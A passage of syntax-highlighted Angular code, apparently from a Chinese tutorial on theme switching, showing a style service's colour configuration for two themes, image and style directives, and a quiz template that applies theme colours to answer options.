    <span class="token keyword">const</span> elStyle <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>style<span class="token punctuation">[</span><span class="token keyword">this</span><span class="token punctuation">.</span>styleType<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> styles<span class="token operator">:</span> any <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> code<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> s <span class="token keyword">in</span> elStyle<span class="token punctuation">[</span>code<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        styles<span class="token punctuation">[</span>s<span class="token punctuation">]</span> <span class="token operator">=</span> elStyle<span class="token punctuation">[</span>code<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>s<span class="token punctuation">]</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> styles<span class="token punctuation">;</span> <span class="token comment">// 👈 通过(需要切换的数组)主题变量到主题变量配置去映射出对应主题样式动态添加到元素</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">private</span> style <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token comment">//主题变量配置</span>
    <span class="token string">'normal'</span><span class="token operator">:</span> <span class="token punctuation">{</span>  <span class="token comment">// 👈 normal主题</span>
      <span class="token string">'index-header-bgc'</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token comment">// 这里的目的是按照特地结构定义的颜色元素</span>
        backgroundImage<span class="token operator">:</span> <span class="token string">'linear-gradient(90deg, #00B887 0%, #15D189 100%)'</span><span class="token punctuation">,</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">'card-bgc'</span><span class="token operator">:</span><span class="token punctuation">{</span>backgroundImage<span class="token operator">:</span><span class="token string">'linear-gradient(0deg,#00a680,#6cd9c0)'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">'result-bgc'</span><span class="token operator">:</span><span class="token punctuation">{</span>backgroundImage<span class="token operator">:</span><span class="token string">'linear-gradient(180deg, #FF7F6B 0%, #FF6952 100%)'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">'main-bgcolor'</span><span class="token operator">:</span> <span class="token punctuation">{</span>  <span class="token comment">// 这里可以规定定义约定级数的颜色层级，或进一步使用颜色变量分级</span>
        backgroundColor<span class="token operator">:</span> <span class="token string">'#1db88e'</span><span class="token punctuation">,</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">'sub-bgcolor'</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        backgroundColor<span class="token operator">:</span> <span class="token string">'#e1f2ed'</span><span class="token punctuation">,</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">'gran-bgcolor'</span><span class="token operator">:</span> <span class="token punctuation">{</span>backgroundColor<span class="token operator">:</span> <span class="token string">'#CCEEE6'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> 
      <span class="token string">'grand-bgcolor'</span><span class="token operator">:</span> <span class="token punctuation">{</span>backgroundColor<span class="token operator">:</span> <span class="token string">'#fafafa'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> 
      <span class="token string">'module-content-bgcolor'</span><span class="token operator">:</span> <span class="token punctuation">{</span>backgroundColor<span class="token operator">:</span> <span class="token string">'#F3FAF8'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">'item-bgcolor'</span><span class="token operator">:</span><span class="token punctuation">{</span>backgroundColor<span class="token operator">:</span><span class="token string">'#A1DCCB'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">'currentVideo-bgcolor'</span><span class="token operator">:</span><span class="token punctuation">{</span>backgroundColor<span class="token operator">:</span><span class="token string">'rgba(113, 122, 120, 0.1)'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">'stroke-color'</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token string">'0%'</span><span class="token operator">:</span> <span class="token string">'#02BA88'</span><span class="token punctuation">,</span> <span class="token string">'100%'</span><span class="token operator">:</span> <span class="token string">'#11CC88'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">'text-tag'</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        backgroundColor<span class="token operator">:</span> <span class="token string">'red'</span><span class="token punctuation">,</span>
        border<span class="token operator">:</span> <span class="token string">'none'</span><span class="token punctuation">,</span>
        color<span class="token operator">:</span> <span class="token string">'white'</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">'main-border'</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        border<span class="token operator">:</span> <span class="token string">'1px solid #1db88e'</span><span class="token punctuation">,</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">'text-tab'</span><span class="token operator">:</span> <span class="token punctuation">{</span>color<span class="token operator">:</span> <span class="token string">'black'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">'main-color'</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        color<span class="token operator">:</span> <span class="token string">'#1db88e'</span><span class="token punctuation">,</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">'sub-color'</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        color<span class="token operator">:</span> <span class="token string">'#6c7179'</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">'page-title-color'</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        color<span class="token operator">:</span> <span class="token string">'#3a3c42'</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">'title-color'</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        color<span class="token operator">:</span> <span class="token string">'#3a3c42'</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">'text-color'</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        color<span class="token operator">:</span> <span class="token string">'#a3abb8'</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">'page-title-bgcolor'</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        backgroundColor<span class="token operator">:</span> <span class="token string">'#fff'</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">'sign-bgcolor'</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        backgroundColor<span class="token operator">:</span> <span class="token string">'#aaaaaa'</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">'sprint-color-style'</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        backgroundColor<span class="token operator">:</span> <span class="token string">'#FAA700'</span><span class="token punctuation">,</span>
        color<span class="token operator">:</span><span class="token string">'#fff'</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">'jingjiang-color-style'</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        backgroundColor<span class="token operator">:</span> <span class="token string">'#009E7A'</span><span class="token punctuation">,</span>
        color<span class="token operator">:</span><span class="token string">'#fff'</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">'yati-color-style'</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        backgroundColor<span class="token operator">:</span> <span class="token string">'#ecb74c'</span><span class="token punctuation">,</span>
        color<span class="token operator">:</span><span class="token string">'#fff'</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token string">'educational'</span><span class="token operator">:</span> <span class="token punctuation">{</span>  <span class="token comment">// 👈 educational主题</span>
      <span class="token string">'index-header-bgc'</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        backgroundImage<span class="token operator">:</span> <span class="token string">'linear-gradient(90deg, #FDC652, #FDC652, #F89D26)'</span><span class="token punctuation">,</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">'card-bgc'</span><span class="token operator">:</span><span class="token punctuation">{</span>backgroundImage<span class="token operator">:</span><span class="token string">'linear-gradient(0deg, #f1a300, #fbcd92)'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">'result-bgc'</span><span class="token operator">:</span><span class="token punctuation">{</span>backgroundImage<span class="token operator">:</span><span class="token string">'linear-gradient(180deg, #f1a300 0%, #fbcd92 100%)'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">'main-bgcolor'</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        backgroundColor<span class="token operator">:</span> <span class="token string">'#FF9900'</span><span class="token punctuation">,</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">'sub-bgcolor'</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        backgroundColor<span class="token operator">:</span> <span class="token string">'#ffebcc'</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">'main-border'</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        border<span class="token operator">:</span> <span class="token string">'1px solid #FF9900'</span><span class="token punctuation">,</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">'gran-bgcolor'</span><span class="token operator">:</span> <span class="token punctuation">{</span>backgroundColor<span class="token operator">:</span> <span class="token string">'#fdc652'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">'grand-bgcolor'</span><span class="token operator">:</span> <span class="token punctuation">{</span>backgroundColor<span class="token operator">:</span> <span class="token string">'#fffbf4'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">'module-content-bgcolor'</span><span class="token operator">:</span> <span class="token punctuation">{</span>backgroundColor<span class="token operator">:</span> <span class="token string">'#fffbf4'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">'item-bgcolor'</span><span class="token operator">:</span><span class="token punctuation">{</span>backgroundColor<span class="token operator">:</span><span class="token string">'#f9d3ac'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">'currentVideo-bgcolor'</span><span class="token operator">:</span><span class="token punctuation">{</span>backgroundColor<span class="token operator">:</span><span class="token string">'rgba(113, 122, 120, 0.1)'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">'stroke-color'</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token string">'0%'</span><span class="token operator">:</span> <span class="token string">'#FF9900'</span><span class="token punctuation">,</span> <span class="token string">'100%'</span><span class="token operator">:</span> <span class="token string">'#FF9900'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">'text-tag'</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        backgroundColor<span class="token operator">:</span> <span class="token string">'white'</span><span class="token punctuation">,</span>
        color<span class="token operator">:</span> <span class="token string">'#FF9900'</span><span class="token punctuation">,</span>
        border<span class="token operator">:</span> <span class="token string">'1px solid #FF9900'</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">'text-tab'</span><span class="token operator">:</span> <span class="token punctuation">{</span>color<span class="token operator">:</span> <span class="token string">'white'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">'main-color'</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        color<span class="token operator">:</span> <span class="token string">'#FF9900'</span><span class="token punctuation">,</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">'sub-color'</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        color<span class="token operator">:</span> <span class="token string">'#6c7179'</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">'page-title-color'</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        color<span class="token operator">:</span> <span class="token string">'#3a3c42'</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">'title-color'</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        color<span class="token operator">:</span> <span class="token string">'#3a3c42'</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">'text-color'</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        color<span class="token operator">:</span> <span class="token string">'#a3abb8'</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">'page-title-bgcolor'</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        backgroundColor<span class="token operator">:</span> <span class="token string">'#fff'</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">'sign-bgcolor'</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        backgroundColor<span class="token operator">:</span> <span class="token string">'#aaaaaa'</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">'sprint-color-style'</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        backgroundColor<span class="token operator">:</span> <span class="token string">'#FFFFFF'</span><span class="token punctuation">,</span>
        color<span class="token operator">:</span><span class="token string">'#FF9900'</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">'jingjiang-color-style'</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        backgroundColor<span class="token operator">:</span> <span class="token string">'#FFFFFF'</span><span class="token punctuation">,</span>
        color<span class="token operator">:</span><span class="token string">'#FF9900'</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">'yati-color-style'</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        backgroundColor<span class="token operator">:</span> <span class="token string">'#FFFFFF'</span><span class="token punctuation">,</span>
        color<span class="token operator">:</span><span class="token string">'#FF9900'</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">/*
img-set
*/</span>
<span class="token comment">// img-set..module.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> NgModule <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> CommonModule <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/common'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>ImgSetDirective<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;./img-set.directive&quot;</span><span class="token punctuation">;</span>
@<span class="token function">NgModule</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  declarations<span class="token operator">:</span> <span class="token punctuation">[</span>ImgSetDirective<span class="token punctuation">]</span><span class="token punctuation">,</span>
  imports<span class="token operator">:</span> <span class="token punctuation">[</span>
    CommonModule
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
  exports<span class="token operator">:</span> <span class="token punctuation">[</span>ImgSetDirective<span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">ImgSetModule</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
<span class="token comment">// img-set.directive.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Directive<span class="token punctuation">,</span> ElementRef<span class="token punctuation">,</span> Input<span class="token punctuation">,</span> OnChanges <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> StyleService <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'../style/style.service'</span><span class="token punctuation">;</span>
@<span class="token function">Directive</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'[ImgSet]'</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">ImgSetDirective</span> <span class="token keyword">implements</span> <span class="token class-name">OnChanges</span> <span class="token punctuation">{</span>
  @<span class="token function">Input</span><span class="token punctuation">(</span><span class="token punctuation">)</span> ImgCode<span class="token operator">:</span> string<span class="token punctuation">;</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span>
    <span class="token parameter"><span class="token keyword">private</span> el<span class="token operator">:</span> ElementRef<span class="token punctuation">,</span>
    <span class="token keyword">private</span> style<span class="token operator">:</span> StyleService</span>
  <span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token punctuation">}</span>
  <span class="token function">ngOnChanges</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setImg</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>ImgCode<span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">private</span> <span class="token function">setImg</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token operator">:</span> string</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">const</span> imgUrl <span class="token operator">=</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>style<span class="token punctuation">.</span><span class="token function">getImgUrl</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>imgUrl<span class="token punctuation">)</span><span class="token punctuation">{</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>el<span class="token punctuation">.</span>nativeElement<span class="token punctuation">.</span>style<span class="token punctuation">.</span>backgroundImage <span class="token operator">=</span> imgUrl<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">/*
style-size
*/</span>
<span class="token comment">// style-size.module.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> NgModule <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> CommonModule <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/common'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>StyleSizeDirective<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;./style-size.directive&quot;</span><span class="token punctuation">;</span>
@<span class="token function">NgModule</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  declarations<span class="token operator">:</span> <span class="token punctuation">[</span>StyleSizeDirective<span class="token punctuation">]</span><span class="token punctuation">,</span>
  imports<span class="token operator">:</span> <span class="token punctuation">[</span>
    CommonModule
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
  exports<span class="token operator">:</span> <span class="token punctuation">[</span>StyleSizeDirective<span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">StyleSizeModule</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
<span class="token comment">// style-size.directive.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Directive<span class="token punctuation">,</span> ElementRef<span class="token punctuation">,</span> Input<span class="token punctuation">,</span> OnChanges <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> StyleService <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'../style/style.service'</span><span class="token punctuation">;</span>
@<span class="token function">Directive</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'[StyleSize]'</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">StyleSizeDirective</span> <span class="token keyword">implements</span> <span class="token class-name">OnChanges</span><span class="token punctuation">{</span>
  @<span class="token function">Input</span><span class="token punctuation">(</span><span class="token punctuation">)</span> sizeCode<span class="token operator">:</span> Array<span class="token operator">&lt;</span>string<span class="token operator">&gt;</span><span class="token punctuation">;</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span>
    <span class="token parameter"><span class="token keyword">private</span> el<span class="token operator">:</span> ElementRef<span class="token punctuation">,</span>
    <span class="token keyword">private</span> style<span class="token operator">:</span> StyleService</span>
  <span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
  <span class="token function">ngOnChanges</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setStyle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">setStyle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">const</span> styles <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>style<span class="token punctuation">.</span><span class="token function">getStyle</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>sizeCode<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> protype <span class="token keyword">in</span> styles<span class="token punctuation">)</span><span class="token punctuation">{</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>el<span class="token punctuation">.</span>nativeElement<span class="token punctuation">.</span>style<span class="token punctuation">[</span>protype<span class="token punctuation">]</span> <span class="token operator">=</span> styles<span class="token punctuation">[</span>protype<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">/*
页面中使用
*/</span>
<span class="token comment">// smart-question.component.ts</span>
  <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">'answer'</span><span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">'title'</span><span class="token operator">&gt;</span>选项<span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>ng<span class="token operator">-</span>container <span class="token operator">*</span>ngFor<span class="token operator">=</span><span class="token string">'let itemx of smartQuestion[idx][currenType].questionOptions;let inx=index;'</span><span class="token operator">&gt;</span>
      <span class="token operator">&lt;</span>div <span class="token punctuation">[</span>ngClass<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'{&quot;options-item&quot;:true,error:ifError(itemx),success:ifSuccess(itemx)}'</span> <span class="token operator">*</span>ngIf<span class="token operator">=</span><span class="token string">'ifSelect(itemx)'</span>
           StyleSize <span class="token punctuation">[</span>sizeCode<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'[&quot;main-color&quot;,&quot;main-border&quot;]'</span>  👈 <span class="token function">这部分结构不同主题有两种样式的不同</span>
           <span class="token punctuation">(</span>click<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'clickItem(itemx,inx)'</span><span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span>ng<span class="token operator">-</span>container <span class="token operator">*</span>ngTemplateOutlet<span class="token operator">=</span><span class="token string">'option;context:{itemx:itemx,inx:inx}'</span><span class="token operator">&gt;</span> 👈 由于这部分结构会动态显示，切换显示过程很难获取主题设置之前的样式。
        <span class="token operator">&lt;</span><span class="token operator">/</span>ng<span class="token operator">-</span>container<span class="token operator">&gt;</span> 👈  所以采取替换dom的方案还原之前的样式。使用插槽是为了公用一份dom结构。
      <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
      <span class="token operator">&lt;</span>div <span class="token punctuation">[</span>ngClass<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'{&quot;options-item&quot;:true,error:ifError(itemx),success:ifSuccess(itemx)}'</span>
           <span class="token operator">*</span>ngIf<span class="token operator">=</span><span class="token string">'!ifSelect(itemx)'</span>
           <span class="token punctuation">(</span>click<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'clickItem(itemx,inx)'</span><span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span>ng<span class="token operator">-</span>container <span class="token operator">*</span>ngTemplateOutlet<span class="token operator">=</span><span class="token string">'option;context:{itemx:itemx,inx:inx}'</span><span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span><span class="token operator">/</span>ng<span class="token operator">-</span>container<span class="token operator">&gt;</span>
      <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>ng<span class="token operator">-</span>container<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>ng<span class="token operator">-</span>template #option <span class="token keyword">let</span><span class="token operator">-</span>itemx<span class="token operator">=</span><span class="token string">&quot;itemx&quot;</span> <span class="token keyword">let</span><span class="token operator">-</span>inx<span class="token operator">=</span><span class="token string">'inx'</span><span class="token operator">&gt;</span> 👈  公用一份的dom结构
      <span class="token punctuation">{</span><span class="token punctuation">{</span>itemx<span class="token punctuation">.</span>answerOption<span class="token punctuation">}</span><span class="token punctuation">}</span>：
      <span class="token operator">&lt;</span>div <span class="token punctuation">[</span>innerHTML<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'itemx.answerContent | safeHtml'</span> <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">'option-item-span'</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>ng<span class="token operator">-</span>template<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">'tips'</span><span class="token operator">&gt;</span>
      <span class="token operator">&lt;</span>span <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">'error'</span> <span class="token operator">*</span>ngIf<span class="token operator">=</span><span class="token string">'answerCorrect(idx)'</span><span class="token operator">&gt;</span>
        回答错误 <span class="token punctuation">,</span>
      <span class="token operator">&lt;</span><span class="token operator">/</span>span<span class="token operator">&gt;</span>
      <span class="token operator">&lt;</span>span <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">'success'</span> <span class="token operator">*</span>ngIf<span class="token operator">=</span><span class="token string">'answerError(idx)'</span> StyleSize <span class="token punctuation">[</span>sizeCode<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'[&quot;main-color&quot;]'</span><span class="token operator">&gt;</span>
        回答正确 <span class="token punctuation">,</span>
      <span class="token operator">&lt;</span><span class="token operator">/</span>span<span class="token operator">&gt;</span>
      <span class="token operator">&lt;</span>ng<span class="token operator">-</span>container <span class="token operator">*</span>ngIf<span class="token operator">=</span><span class="token string">'smartQuestion[idx][currenType].isCorrect!==undefined'</span><span class="token operator">&gt;</span>
         <span class="token operator">&lt;</span>span <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">'info'</span><span class="token operator">&gt;</span>
        <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span>正确答案：
      <span class="token operator">&lt;</span><span class="token operator">/</span>span<span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span>span <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">'answer'</span> StyleSize <span class="token punctuation">[</span>sizeCode<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'[&quot;main-color&quot;]'</span><span class="token operator">&gt;</span>
      <span class="token punctuation">{</span><span class="token punctuation">{</span>answer<span class="token punctuation">[</span>currenType<span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
      <span class="token operator">&lt;</span><span class="token operator">/</span>span<span class="token operator">&gt;</span>
      <span class="token operator">&lt;</span><span class="token operator">/</span>ng<span class="token operator">-</span>container<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span 